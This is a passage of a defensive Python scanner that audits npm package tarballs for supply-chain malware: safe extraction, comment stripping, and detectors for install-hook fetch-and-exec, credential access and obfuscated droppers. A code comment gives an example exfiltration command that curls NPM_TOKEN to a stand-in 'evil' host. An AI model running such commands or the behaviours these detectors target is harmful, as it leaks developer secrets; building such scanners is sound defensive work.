    if decoded is None:
        return dest, f"unparseable integrity field {entry.integrity!r}"
    algo, expected_digest = decoded
    h = hashlib.new(algo)

    req = urllib.request.Request(
        entry.resolved,
        headers = {
            "User-Agent": "unsloth-scan-npm-packages/1.0 (+supply-chain audit)",
            "Accept": "application/octet-stream",
        },
        method = "GET",
    )
    try:
        with urllib.request.urlopen(req, timeout = timeout) as r:
            # Advertised length, if any.
            cl = r.headers.get("Content-Length")
            if cl is not None:
                try:
                    cl_int = int(cl)
                    if cl_int > max_bytes:
                        return dest, (f"Content-Length {cl_int} > cap {max_bytes}")
                except ValueError:
                    pass
            written = 0
            with open(dest, "wb") as out:
                while True:
                    chunk = r.read(64 * 1024)
                    if not chunk:
                        break
                    written += len(chunk)
                    if written > max_bytes:
                        return dest, (
                            f"download exceeded cap {max_bytes} bytes " f"after {written} bytes"
                        )
                    h.update(chunk)
                    out.write(chunk)
    except Exception as exc:
        return dest, f"download failed: {exc}"

    actual = h.digest()
    if actual != expected_digest:
        return dest, (
            f"integrity mismatch: expected {algo}={_b64.b64encode(expected_digest).decode()!r}, "
            f"got {algo}={_b64.b64encode(actual).decode()!r}"
        )
    return dest, None


# ─────────────────────────────────────────────────────────────────────
# Safe tar extraction. Every Tarfile member is policed before write.
# ─────────────────────────────────────────────────────────────────────


def _is_within(root: Path, candidate: Path) -> bool:
    try:
        return candidate.resolve().is_relative_to(root.resolve())
    except (AttributeError, ValueError):
        # Python <3.9 fallback (we target 3.10+ but be defensive).
        try:
            candidate.resolve().relative_to(root.resolve())
            return True
        except Exception:
            return False


def safe_extract(
    tarball_path: Path,
    extract_root: Path,
    *,
    max_total_bytes: int = HARD_MAX_TOTAL_BYTES,
    max_members: int = HARD_MAX_MEMBERS,
) -> str | None:
    """Extract tarball_path under extract_root with policed members.

    Returns None on success, or a string describing the refusal.
    Streams via `r|gz` so we can abort mid-extraction without having
    materialised the rest of the archive.
    """
    extract_root.mkdir(parents = True, exist_ok = True)
    total = 0
    count = 0
    try:
        # Streaming mode (no backward seeks); `r|gz` rejects bad gzip.
        with tarfile.open(tarball_path, mode = "r|gz") as tf:
            for member in tf:
                count += 1
                if count > max_members:
                    return f"member count {count} exceeded cap {max_members}"
                name = member.name
                # Reject obvious path-escape.
                if name.startswith("/") or ".." in Path(name).parts:
                    return f"refused unsafe member name {name!r}"
                # Reject device files, FIFOs, sockets, symlinks, hardlinks.
                if member.issym() or member.islnk():
                    return f"refused link member {name!r} (sym/lnk)"
                if member.isdev() or member.isfifo():
                    return f"refused special member {name!r}"
                # Check declared size up front to short-circuit bombs
                # without reading the body.
                declared = max(member.size, 0)
                if declared > HARD_MAX_BINARY_FILE_BYTES:
                    return (
                        f"member {name!r} declared size {declared} > "
                        f"absolute cap {HARD_MAX_BINARY_FILE_BYTES}"
                    )
                if total + declared > max_total_bytes:
                    return (
                        f"cumulative bytes {total + declared} > cap "
                        f"{max_total_bytes} at {name!r}"
                    )
                # Resolve destination and refuse anything escaping root
                # (don't trust the npm "package/" convention).
                dest = extract_root / name
                if not _is_within(extract_root, dest):
                    return f"refused escape: {name!r} resolved outside root"
                if member.isdir():
                    dest.mkdir(parents = True, exist_ok = True)
                    continue
                if not member.isfile():
                    # Anything we didn't classify above is unknown.
                    return f"refused unknown member type for {name!r}"
                dest.parent.mkdir(parents = True, exist_ok = True)
                src = tf.extractfile(member)
                if src is None:
                    continue
                # Sniff first 16 bytes to classify text vs binary;
                # each gets its own cap (both are bounded).
                header = src.read(16)
                is_binary = _looks_binary(name, header)
                file_cap = HARD_MAX_BINARY_FILE_BYTES if is_binary else HARD_MAX_TEXT_FILE_BYTES
                if declared > file_cap:
                    return (
                        f"member {name!r} declared size {declared} > "
                        f"cap {file_cap} ({'binary' if is_binary else 'text'})"
                    )
                # Read remainder, bounded.
                remainder_cap = file_cap - len(header)
                rest = src.read(remainder_cap + 1)
                data = header + rest
                if len(data) > file_cap:
                    return (
                        f"member {name!r} body exceeded declared size cap "
                        f"({'binary' if is_binary else 'text'})"
                    )
                total += len(data)
                # Restrictive mode (rw-r--r--): nothing executable.
                with open(dest, "wb") as out:
                    out.write(data)
                os.chmod(dest, 0o644)
    except tarfile.TarError as exc:
        return f"tar parse error: {exc}"
    except Exception as exc:
        return f"unexpected extract error: {exc!r}"
    return None


# ─────────────────────────────────────────────────────────────────────
# Content scanning.
# ─────────────────────────────────────────────────────────────────────


# How far back to look for an enclosing bracket opener. Symmetric with the
# forward cap so a host that sits deep inside a large options object (its opening
# `{` many properties above) still binds the whole object, not just its own line;
# a too-far start only over-binds (more context, still fail-closed), never less.
_MAX_CONT_LINES = 200
# Hard cap on how far forward a bracket group is followed to its close, measured
# from the matched line so the tail after the match is always reachable even when
# the opener was found near the backward limit (digest input only, never
# displayed); a realistic config object closes well within it.
_MAX_GROUP_LINES = 200

# JS string literal (single / double / template), blanked before counting
# brackets so a bracket inside a string is not mistaken for code.
_RE_JS_STR = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"|`(?:[^`\\]|\\.)*`")


_RE_BRACKETS = re.compile(r"[()\[\]{}]")
_OPENERS = frozenset("([{")


def _bracket_lr(line: str) -> tuple[int, int]:
    """Order-aware bracket reduction of one already-string-blanked line: ``(L, R)``
    where ``L`` is the count of closers with no opener earlier on the line (they
    need an opener to the LEFT / on a prior line) and ``R`` is the count of openers
    with no closer later on the line (they need a closer to the RIGHT / on a later
    line). A plain net count (opens minus closes) collapses order and so masks a
    trailing opener that follows leading closers on the same line, e.g.
    ``}); const opts = {`` nets -1 and hides the ``{`` that opens the host-config
    object; tracking the running minimum keeps that opener visible so the group
    binds the path/headers that follow. Only bracket characters are walked (pulled
    out with one C-level regex pass) so a long minified line stays cheap."""
    depth = 0
    low = 0
    for ch in _RE_BRACKETS.findall(line):
        if ch in _OPENERS:
            depth += 1
        else:
            depth -= 1
            if depth < low:
                low = depth
    return -low, depth - low


def _find_unescaped(line: str, quote: str, start: int) -> int:
    """Index of the next ``quote`` at or after ``start`` not escaped by a backslash,
    or -1. Skips ``\\x`` pairs so an escaped quote inside the string is ignored."""
    i, n = start, len(line)
    while i < n:
        if line[i] == "\\":
            i += 2
            continue
        if line[i] == quote:
            return i
        i += 1
    return -1


# A `/` is a regex literal (not division) when the previous significant character
# is none (start) or one of these expression-position chars. Used only by the
# multi-line blanked view, and the span is unioned with the single-line view, so
# an over- or under-detection only ever grows the bound span (never shrinks it).
_JS_REGEX_PRECEDERS = frozenset("([{,;:?=&|!+-*/%^~<>")


def _blank_js_strings(lines: list[str]) -> list[str]:
    """Replace string contents (single, double, multi-line backtick template
    literals) AND regex literal bodies with spaces across ``lines``, keeping the
    line count and every bracket OUTSIDE a string/regex intact, so bracket counting
    never miscounts a ``)`` that lives inside a string -- including a template
    literal spanning several lines or a ``/)/`` regex -- which a per-line regex
    cannot blank. Escapes are honoured."""
    out: list[str] = []
    in_back = False  # inside a multi-line `template` literal
    prev_sig = ""  # last significant non-space char (for regex-vs-division)
    for line in lines:
        buf: list[str] = []
        i, n = 0, len(line)
        while i < n:
            if in_back:
                end = _find_unescaped(line, "`", i)
                if end == -1:
                    buf.append(" " * (n - i))
                    i = n
                else:
                    buf.append(" " * (end - i + 1))
                    i = end + 1
                    in_back = False
                    prev_sig = "`"
                continue
            ch = line[i]
            if ch in " \t":
                buf.append(ch)
                i += 1
                continue
            if ch in "'\"`":
                end = _find_unescaped(line, ch, i + 1)
                if end == -1:
                    buf.append(" " * (n - i))
                    i = n
                    if ch == "`":  # opens a template literal that runs past this line
                        in_back = True
                else:
                    buf.append(" " * (end - i + 1))
                    i = end + 1
                prev_sig = "v"  # a string is a value: a following `/` is division
                continue
            if ch == "/" and (prev_sig == "" or prev_sig in _JS_REGEX_PRECEDERS):
                # Regex literal: blank to the closing unescaped `/` outside a `[...]`
                # char class. A regex never spans lines, so no close on the line
                # means this `/` is really division.
                j, in_class, closed = i + 1, False, False
                while j < n:
                    c = line[j]
                    if c == "\\":
                        j += 2
                        continue
                    if c == "[":
                        in_class = True
                    elif c == "]":
                        in_class = False
                    elif c == "/" and not in_class:
                        j += 1
                        closed = True
                        break
                    j += 1
                if closed:
                    buf.append(" " * (j - i))
                    i = j
                    prev_sig = "v"  # a regex is a value
                    continue
                buf.append(ch)
                i += 1
                prev_sig = "/"
                continue
            buf.append(ch)
            i += 1
            prev_sig = ch
        out.append("".join(buf))
    return out


def _index_text(text: str) -> tuple[list[str], list[str], list[str], list[int]]:
    """Precompute once per evidence call: raw lines for display, two string-blanked
    views for bracket counting (single-line via regex = legacy, and multi-line
    aware so a template literal spanning lines is blanked), and newline offsets for
    O(log n) offset-to-line mapping. Avoids re-splitting and re-counting the whole
    file on every single match (which was O(matches x file size))."""
    lines = text.split("\n")
    sl_blanked = [_RE_JS_STR.sub("", ln) for ln in lines]
    ml_blanked = _blank_js_strings(lines)
    nl = [p for p, ch in enumerate(text) if ch == "\n"]
    return lines, sl_blanked, ml_blanked, nl


# Cap on formatted matches in one evidence string; beyond it the remaining match
# texts are folded into a single digest so a huge/minified file cannot build a
# multi-megabyte evidence blob while an added/removed match past the cap still
# changes the key.
_MAX_EVIDENCE_MATCHES = 64


def _scan_group(blanked: list[str], idx: int) -> tuple[int, int]:
    """(start, end) line indices of the bracket group enclosing line ``idx`` in one
    blanked view: scan back to the still-open opener, then forward to its close."""
    # Backward: find the line that opens a bracket still unclosed at the match,
    # so a match inside a multi-line object starts from the object opener. Each line
    # is reduced to (L, R) and applied in order: first the L closers consume open
    # brackets from the running context (a stray closer whose opener is outside the
    # window only clamps depth at 0, it never goes negative), then the R openers
    # add to it. Tracking order this way (rather than a single net per line) keeps a
    # trailing opener visible even when leading closers on the same line net it to
    # <= 0, e.g. `}); const opts = {`, which a net count would drop -- letting a
    # changed path/headers after such a line ride the unchanged-hostname key.
    start = idx
    depth = 0
    for j in range(max(0, idx - _MAX_CONT_LINES), idx):
        left, right = _bracket_lr(blanked[j])
        if left >= depth:
            depth = 0  # everything opened so far in the window has closed
            start = idx
        else:
            depth -= left
        if right > 0:
            if depth == 0:
                start = j  # outermost still-open opener begins here
            depth += right

    # Forward: extend until the group opened at `start` closes past the match. The
    # same order-aware reduction is used (clamping leading closers at 0) so the
    # foreign `})` on the opener line does not drive the count negative and stop the
    # scan before the real close. The cap is measured from the match (`idx`), not
    # from `start`, so an opener found near the backward limit does not eat the
    # whole forward budget and drop the path/headers/body that follow the match.
    depth = 0
    end = start
    for j in range(start, min(len(blanked), idx + _MAX_GROUP_LINES)):
        left, right = _bracket_lr(blanked[j])
        depth = max(0, depth - left) + right
        end = j
        if j >= idx and depth <= 0:
            break
    return start, end


def _canon_preserve_strings(text: str) -> str:
    """Whitespace canon that collapses runs OUTSIDE string literals to a single
    space (so a reindent or spacing change between tokens stays stable) while
    preserving whitespace INSIDE single/double/backtick string literals (so a
    changed payload body, e.g. ``'a b'`` -> ``'a  b'``, reopens). A plain
    ``" ".join(text.split())`` erases both, suppressing an intra-literal payload
    edit along with harmless indentation. Leading/trailing outside whitespace is
    dropped; escapes inside strings are honoured. Used for the evidence hash and
    the logical-line digests so the two stay consistent."""
    out: list[str] = []
    i, n = 0, len(text)
    quote: str | None = None
    pending_space = False
    while i < n:
        ch = text[i]
        if quote is not None:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(text[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch.isspace():
            pending_space = True
            i += 1
            continue
        if pending_space and out:
            out.append(" ")
        pending_space = False
        out.append(ch)
        if ch in "'\"`":
            quote = ch
        i += 1
    return "".join(out)


def _logical_line_text(
    lines: list[str], sl_blanked: list[str], ml_blanked: list[str], idx: int
) -> str:
    """The matched line plus the bracket group it belongs to (the enclosing
    multi-line object/call, so a changed ``path``/``headers``/body on another line
    binds). Returns the UNION of the groups found in the single-line-blanked view
    (legacy: a payload embedded inside a template still counts so its brackets bind
    the call) and the multi-line-blanked view (a bracket inside a template literal
    spanning lines no longer closes the group early). Unioning never shrinks the
    span below either view, so neither blanking strategy can drop a line a
    malicious change relies on."""
    s1, e1 = _scan_group(sl_blanked, idx)
    s2, e2 = _scan_group(ml_blanked, idx)
    start, end = min(s1, s2), max(e1, e2)
    return " ".join(lines[start : end + 1])


def _format_match(
    text: str,
    lines: list[str],
    sl_blanked: list[str],
    ml_blanked: list[str],
    nl: list[int],
    m: re.Match,
    max_chars: int,
) -> str:
    # The shown snippet is a small window around the match; append a digest of the
    # full LOGICAL line (the matched line plus its bracket-continuation lines)
    # whenever the snippet does not already show all of it, so a changed payload
    # tail, a truncated body, or a multi-line option/header reopens. Offsets are
    # mapped to line numbers via bisect over precomputed newline positions, so this
    # is O(log n) instead of rescanning the file prefix for every match.
    idx = bisect.bisect_left(nl, m.start())  # 0-based line index of the match
    line_start = nl[idx - 1] + 1 if idx > 0 else 0
    ke = bisect.bisect_left(nl, m.end())
    line_end = nl[ke] if ke < len(nl) else len(text)
    full_logical = _logical_line_text(lines, sl_blanked, ml_blanked, idx)
    start = max(line_start, m.start() - 30)
    end = min(line_end, m.end() + 30)
    snippet = text[start:end].replace("\n", " ")
    if len(snippet) > max_chars:
        snippet = snippet[:max_chars] + "..."
    if snippet != full_logical:
        # Normalize before digesting, matching _evidence_hash, so a formatter-only
        # reindent of the bound continuation lines does not reopen -- but preserve
        # whitespace inside string literals so a changed request/payload body does.
        canon = _canon_preserve_strings(full_logical)
        digest = hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()
        snippet = f"{snippet} sha256:{digest}"
    return snippet


def _stream_overflow_digest(
    matches, lines: list[str], sl_blanked: list[str], ml_blanked: list[str], nl: list[int]
) -> tuple[int, str]:
    """A single digest binding the LOGICAL line (the bound bracket-group context,
    not just the regex match text) of every overflow match in the iterable, plus
    the count of matches folded. Streams the matches (any iterable of re.Match) so a
    huge overflow never materializes a list. Whitespace-normalized to match
    _evidence_hash so a reindent does not reopen."""
    h = hashlib.sha256()
    count = 0
    for m in matches:
        _fold_overflow_match(h, m, lines, sl_blanked, ml_blanked, nl)
        count += 1
    return count, h.hexdigest()


def _fold_overflow_match(
    h, m: re.Match, lines: list[str], sl_blanked: list[str], ml_blanked: list[str], nl: list[int]
) -> None:
    """Fold one overflow match's whitespace-normalized logical-line context into the
    running hash ``h``. Shared by _stream_overflow_digest and the inline overflow
    fold in _outbound_host_evidence so both produce the identical digest."""
    idx = bisect.bisect_left(nl, m.start())
    ll = _logical_line_text(lines, sl_blanked, ml_blanked, idx)
    h.update(b"\x00")
    h.update(_canon_preserve_strings(ll).encode("utf-8", "replace"))


def _evidence(
    text: str,
    pat: re.Pattern,
    max_chars: int = 200,
) -> str:
    # Record every match (not a truncated sample) so an extra match appended to an
    # already-flagged file changes the evidence instead of riding the first few.
    # Past _MAX_EVIDENCE_MATCHES the remaining matches are folded into one digest
    # (binding their logical-line context) so the evidence string stays bounded
    # while a changed payload past the cap still reopens. The matches are streamed
    # from finditer rather than materialized into a list: a generated file can
    # repeat a cheap signal (e.g. NPM_TOKEN) millions of times, and holding a
    # re.Match per occurrence before applying the cap would stall or OOM the scan.
    it = pat.finditer(text)
    shown_matches = list(itertools.islice(it, _MAX_EVIDENCE_MATCHES))
    if not shown_matches:
        return ""
    lines, sl_blanked, ml_blanked, nl = _index_text(text)
    shown = [
        _format_match(text, lines, sl_blanked, ml_blanked, nl, m, max_chars) for m in shown_matches
    ]
    # Fold the rest (past the cap) into one digest as they arrive, never building a
    # second list. Byte-identical to digesting matches[_MAX_EVIDENCE_MATCHES:].
    overflow_count, digest = _stream_overflow_digest(it, lines, sl_blanked, ml_blanked, nl)
    if overflow_count:
        shown.append(f"(+{overflow_count} more) sha256:{digest}")
    return " | ".join(shown)


def _ioc_evidence(text: str, needle: str) -> str:
    """Matched-line context (with bracket-group continuation) for a literal IOC
    needle, so a changed adjacent fetch/exfil body reopens the key instead of
    riding the bare constant. Falls back to the needle itself if, defensively,
    nothing matches (the caller only reaches here when ``needle in text``)."""
    return _evidence(text, re.compile(re.escape(needle))) or needle


LIFECYCLE_HOOKS = ("preinstall", "install", "postinstall", "prepare")


# ─────────────────────────────────────────────────────────────────────
# Code-only scanning for JS/TS sources. Blank `//` and `/* */` comments
# before matching (the top FP source: scary strings in JSDoc/changelog
# comments), tracking string/template/regex context so a `//` inside
# "http://..." is not mistaken for a comment. Strings are NOT blanked
# (droppers hide payloads there). Fail open on lexer confusion: the raw
# text is still scanned. JS sibling of scan_packages.py::_strip_noncode.
# ─────────────────────────────────────────────────────────────────────
_JS_FAMILY_SUFFIXES = (".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx")

# Keywords after which a `/` begins a regex literal (not division).
_REGEX_PRECEDING_KEYWORDS = frozenset(
    {
        "return",
        "typeof",
        "instanceof",
        "in",
        "of",
        "new",
        "delete",
        "void",
        "throw",
        "yield",
        "await",
        "do",
        "else",
        "case",
    }
)
_IDENT_CHARS = frozenset("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$")


def _slash_is_regex(prev_tok: str) -> bool:
    """Disambiguate a lone ``/``: regex literal vs division operator.

    Biased toward regex when ambiguous -- regex state never blanks, so a
    wrong guess only costs FP reduction (or a fail-open), never a missed
    detection.
    """
    if prev_tok == "":
        return True  # start of file -> expression position
    if prev_tok in _REGEX_PRECEDING_KEYWORDS:
        return True
    last = prev_tok[-1]
    if last.isalnum() or last in "_$)]":
        return False  # previous token ends a value -> division
    return True  # operators, punctuation, `{`, `}` -> regex (safe bias)


def _strip_js_noncode(text: str) -> str:
    """Blank JS/TS comments, preserving byte geometry. Fail-open on confusion."""
    if "//" not in text and "/*" not in text:
        return text  # nothing to strip
    n = len(text)
    out = list(text)
    nl = ("\n", "\r")

    def _blank(a: int, b: int) -> None:
        for k in range(a, b):
            if out[k] not in nl:
                out[k] = " "

    state = "code"
    prev_tok = ""
    tmpl_stack: list[str] = []
    i = 0
    try:
        while i < n:
            c = text[i]
            nxt = text[i + 1] if i + 1 < n else ""
            if state == "code":
                if c == "/" and nxt == "/":
                    start = i
                    i += 2
                    while i < n and text[i] not in nl:
                        i += 1
                    _blank(start, i)
                    continue
                if c == "/" and nxt == "*":
                    start = i
                    i += 2
                    closed = False
                    while i < n:
                        if text[i] == "*" and i + 1 < n and text[i + 1] == "/":
                            i += 2
                            closed = True
                            break
                        i += 1
                    if not closed:
                        return text  # unterminated block comment
                    _blank(start, i)
                    continue
                if c == "'":
                    state = "sq"
                    i += 1
                    continue
                if c == '"':
                    state = "dq"
                    i += 1
                    continue
                if c == "`":
                    state = "tmpl"
                    i += 1
                    continue
                if c == "/":
                    if _slash_is_regex(prev_tok):
                        state = "regex"
                        i += 1
                        continue
                    prev_tok = "/"
                    i += 1
                    continue
                if c.isspace():
                    i += 1
                    continue
                if c in _IDENT_CHARS:
                    j = i
                    while j < n and text[j] in _IDENT_CHARS:
                        j += 1
                    prev_tok = text[i:j]
                    i = j
                    continue
                if c == "}" and tmpl_stack:
                    state = tmpl_stack.pop()
                    i += 1
                    continue
                prev_tok = c
                i += 1
                continue
            elif state in ("sq", "dq"):
                q = "'" if state == "sq" else '"'
                if c == "\\":
                    i += 2
                    continue
                if c == q:
                    state = "code"
                    prev_tok = "_v"
                    i += 1
                    continue
                if c in nl:
                    return text  # unterminated string literal
                i += 1
                continue
            elif state == "tmpl":
                if c == "\\":
                    i += 2
                    continue
                if c == "`":
                    state = "code"
                    prev_tok = "_v"
                    i += 1
                    continue
                if c == "$" and nxt == "{":
                    tmpl_stack.append("tmpl")
                    state = "code"
                    prev_tok = "{"
                    i += 2
                    continue
                i += 1
                continue
            elif state == "regex":
                if c == "\\":
                    i += 2
                    continue
                if c == "[":
                    state = "regex_cc"
                    i += 1
                    continue
                if c == "/":
                    state = "code"
                    prev_tok = "_v"
                    i += 1
                    continue
                if c in nl:
                    return text  # unterminated regex literal
                i += 1
                continue
            elif state == "regex_cc":
                if c == "\\":
                    i += 2
                    continue
                if c == "]":
                    state = "regex"
                    i += 1
                    continue
                if c in nl:
                    return text
                i += 1
                continue
            else:
                return text
        if state != "code" or tmpl_stack:
            return text  # unterminated construct -> fail open
    except Exception:
        return text
    return "".join(out)


def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
    findings: list[Finding] = []
    try:
        meta = json.loads(text)
    except Exception:
        return findings
    if not isinstance(meta, dict):
        return findings
    scripts = meta.get("scripts") or {}
    if not isinstance(scripts, dict):
        return findings
    for hook in LIFECYCLE_HOOKS:
        body = scripts.get(hook)
        if not isinstance(body, str):
            continue
        # Pin the whole lifecycle body via one digest shared by every lifecycle
        # finding below: a script that keeps the matched signal but changes
        # another line (e.g. swapping `echo safe` for `curl -d "$NPM_TOKEN"
        # https://evil`) must reopen. The stored evidence is a bounded matched
        # snippet plus this digest, never the entire body, so `--write-baseline`
        # on a package with a multi-MiB install script does not bloat the baseline
        # JSON while the digest still binds the full body. Normalized to match
        # _evidence_hash so a reindent alone does not reopen, while whitespace
        # inside quoted strings is preserved so a changed quoted payload does.
        body_digest = hashlib.sha256(
            _canon_preserve_strings(body).encode("utf-8", "replace")
        ).hexdigest()
        if _LIFECYCLE_FETCH_EXEC.search(body):
            findings.append(
                Finding(
                    severity = CRITICAL,
                    package = pkg.display,
                    filename = rel,
                    pattern = f"lifecycle-fetch-exec ({hook})",
                    evidence = f"{_evidence(body, _LIFECYCLE_FETCH_EXEC)} body-sha256:{body_digest}",
                    detail = (
                        f"`scripts.{hook}` fetches an external "
                        "resource and pipes/chains it to an "
                        "interpreter; this is the install-time RCE "
                        "vector. Refusing to install."
                    ),
                )
            )
        # Cred file paths in a lifecycle script are exfil prep (npm
        # auto-runs these on `npm ci`); manual scripts are out of scope.
        for path_substr, why in CRED_PATH_SUBSTRINGS:
            if path_substr in body:
                findings.append(
                    Finding(
                        severity = HIGH,
                        package = pkg.display,
                        filename = rel,
                        pattern = f"cred-path-in-lifecycle ({hook})",
                        evidence = (
                            f"{_evidence(body, re.compile(re.escape(path_substr)))} "
                            f"body-sha256:{body_digest}"
                        ),
                        detail = (
                            f"`scripts.{hook}` references {why} "
                            f"({path_substr!r}); install-time access "
                            "to local credential files is the "
                            "exfiltration prep step"
                        ),
                    )
                )
        if _JS_ENV_TOKEN.search(body):
            findings.append(
                Finding(
                    severity = HIGH,
                    package = pkg.display,
                    filename = rel,
                    pattern = f"cred-env-in-lifecycle ({hook})",
                    evidence = f"{_evidence(body, _JS_ENV_TOKEN)} body-sha256:{body_digest}",
                    detail = (
                        f"`scripts.{hook}` references a credential "
                        "env var (GITHUB_TOKEN / NPM_TOKEN / AWS_* "
                        "/ etc); install-time access to runner "
                        "secrets is the exfiltration prep step"
                    ),
                )
            )
    # Optional deps pointing at github: are the TanStack-style
    # injection vector.
    opt = meta.get("optionalDependencies") or {}
    if isinstance(opt, dict):
        for k, v in opt.items():
            if isinstance(v, str) and (
                v.startswith("github:") or v.startswith("git+") or v.startswith("git://")
            ):
                findings.append(
                    Finding(
                        severity = HIGH,
                        package = pkg.display,
                        filename = rel,
                        pattern = "optional-dep-non-registry",
                        evidence = f"{k}={v}",
                        detail = (
                            "package.json `optionalDependencies` "
                            "points at a non-registry source; this "
                            "is the Shai-Hulud worm injection shape."
                        ),
                    )
                )
    return findings


def _host_in_outbound_context(text: str, host: str) -> bool:
    """True if `host` appears consistent with an outbound call.

    A bare array literal (defensive blocklist) is safe; co-occurrence
    with an HTTP URL scheme or a fetch verb in a short window is not.
    """
    # Escape for regex (IPs contain dots).
    host_re = re.escape(host)
    # 1. URL form: http://host or https://host or //host/ or //host"
    url_form = re.compile(
        rf"(?:https?:)?//{host_re}(?:[:/\"'?#]|$)",
    )
    if url_form.search(text):
        return True
    # 2. host appears within 200 chars of a fetch verb (either side).
    fetch_context = re.compile(
        rf"(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}{host_re}"
        rf"|{host_re}[^\n]{{0,200}}(?:{_FETCH_VERBS_PAT})",
        re.IGNORECASE,
    )
    if fetch_context.search(text):
        return True
    # 3. `host:` / `hostname:` config field referencing the IP.
    cfg_form = re.compile(
        rf"(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`]",
        re.IGNORECASE,
    )
    if cfg_form.search(text):
        return True
    return False


def _outbound_host_evidence(text: str, host: str) -> str:
    """Evidence capturing the host WITH its outbound context (URL path, fetch
    call, host config), so a changed path/headers/body reopens the key instead
    of riding the bare host literal. Falls back to the host if none matches."""
    host_re = re.escape(host)
    patterns = (
        re.compile(rf"(?:https?:)?//{host_re}(?:[:/\"'?#][^\n]*)?", re.IGNORECASE),
        re.compile(
            rf"(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}{host_re}[^\n]{{0,200}}"
            rf"|{host_re}[^\n]{{0,200}}(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}",
            re.IGNORECASE,
        ),
        # Host-config form: capture the whole line (path/headers/body), so a
        # changed outbound payload on the same hostname line reopens the key.
        re.compile(rf"[^\n]*(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`][^\n]*", re.IGNORECASE),
    )
    # Record EVERY outbound context for the host, not just the first form that
    # matches: a file that already has a baselined URL for the host and later adds
    # a separate host-config request (or a second URL) must change the evidence so
    # the new payload cannot inherit the old key. Forms are claimed in order, and a
    # region already claimed by an earlier form is skipped, so the common
    # single-context case keeps its existing snippet. Each form is capped at
    # _MAX_EVIDENCE_MATCHES matches so a host repeated thousands of times in a
    # minified file cannot make the overlap check quadratic; once chosen is full
    # the rest are folded into a digest AS THEY ARRIVE (never accumulated into a
    # list, so a host repeated millions of times cannot OOM the scan) and an added
    # context still reopens.
    lines, sl_blanked, ml_blanked, nl = _index_text(text)
    claimed: list[tuple[int, int]] = []
    chosen: list[re.Match] = []
    overflow_count = 0
    overflow_hash = hashlib.sha256()
    for pat in patterns:
        for m in pat.finditer(text):
            if len(chosen) < _MAX_EVIDENCE_MATCHES:
                # Overlap check runs only while filling the display list, so
                # `claimed` is bounded by the cap and this stays O(cap) per match
                # (not quadratic), while every later match is still counted below.
                if any(m.start() < e and s < m.end() for s, e in claimed):
                    continue
                claimed.append((m.start(), m.end()))
                chosen.append(m)
            else:
                _fold_overflow_match(overflow_hash, m, lines, sl_blanked, ml_blanked, nl)
                overflow_count += 1
    if not chosen:
        return host
    chosen.sort(key = lambda m: m.start())
    shown = [_format_match(text, lines, sl_blanked, ml_blanked, nl, m, 1000) for m in chosen]
    if overflow_count:
        shown.append(f"(+{overflow_count} more) sha256:{overflow_hash.hexdigest()}")
    return " | ".join(shown)


def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
    findings: list[Finding] = []

    # Code-only scanning for JS/TS sources: blank comments before matching so
    # an IOC host / `eval(atob)` example / campaign marker quoted in a comment
    # cannot manufacture a false positive. Assigned string literals (where real
    # droppers hide base64 payloads) are preserved. Non-JS text (json/yaml/sh/
    # py/html) is scanned as-is -- this lexer only understands JS comments.
    if rel.lower().endswith(_JS_FAMILY_SUFFIXES):
        text = _strip_js_noncode(text)

    # IOC substrings (literal, case-sensitive). Evidence is the matched-line
    # context (with its bracket-group continuation), not the bare needle: an IOC
    # host/hash left in place while the adjacent fetch/exfil body changes must
    # reopen the key instead of riding the constant.
    for needle, (sev, why) in KNOWN_IOC_STRINGS.items():
        if needle in text:
            findings.append(
                Finding(
                    severity = sev,
                    package = pkg.display,
                    filename = rel,
                    pattern = "known-ioc-string",
                    evidence = _ioc_evidence(text, needle),
                    detail = f"{why}: {needle!r}",
                )
            )

    # Cred surfaces, tier 1: hosts with no legit use. Bind the outbound context
    # (path/headers/body) when present so a changed exfil payload on the same call
    # reopens; falls back to the bare host when it is not in an outbound call.
    for needle, why in CRED_HOST_ALWAYS_BAD:
        if needle in text:
            findings.append(
                Finding(
                    severity = HIGH,
                    package = pkg.display,
                    filename = rel,
                    pattern = "cred-surface-host (always-bad)",
                    evidence = _outbound_host_evidence(text, needle),
                    detail = (
                        f"references {why} ({needle!r}); no legitimate "
                        "frontend use of this surface"
                    ),
                )
            )

    # Cred surfaces, tier 2: hosts that appear in defensive code too;
    # require co-occurrence with a fetch verb or URL prefix.
    for needle, why in CRED_HOST_NEEDS_CONTEXT:
        if needle in text and _host_in_outbound_context(text, needle):
            findings.append(
                Finding(
                    severity = HIGH,
                    package = pkg.display,
                    filename = rel,
                    pattern = "cred-surface-host (outbound)",
                    evidence = _outbound_host_evidence(text, needle),
                    detail = (
                        f"references {why} ({needle!r}) in an outbound "
                        "call / URL / host config; a defensive blocklist "
                        "literal would not match this rule"
                    ),
                )
            )

    # Credential PATHS aren't scanned here (too many FPs at file
    # scope); scan_package_json catches them inside lifecycle scripts.

    # JS-specific regex.
    if _JS_FETCH_EVAL.search(text):
        findings.append(
            Finding(
                severity = HIGH,
                package = pkg.display,
                filename = rel,
                pattern = "js-fetch-eval",
                evidence = _evidence(text, _JS_FETCH_EVAL),
                detail = ("Function/eval against base64-decoded payload (obfuscated dropper shape)"),
            )
        )
    if _JS_ENV_TOKEN.search(text):
        findings.append(
            Finding(
                severity = MEDIUM,
                package = pkg.display,
                filename = rel,
                pattern = "js-env-token",
                evidence = _evidence(text, _JS_ENV_TOKEN),
                detail = ("references credential env vars in package source"),
            )
        )
    if _OBFUSC_BLOB.search(text):
        findings.append(
            Finding(
                severity = HIGH,
                package = pkg.display,
                filename = rel,
                pattern = "obfuscated-blob",
                evidence = _evidence(text, _OBFUSC_BLOB),
                detail = (
                    "large base64-ish blob fed to Function/eval; "
                    "matches the TanStack worm dropper shape"
                ),
            )
        )

    return findings


# Filename suffix decides which scanners run; .cjs/.mjs/.ts are
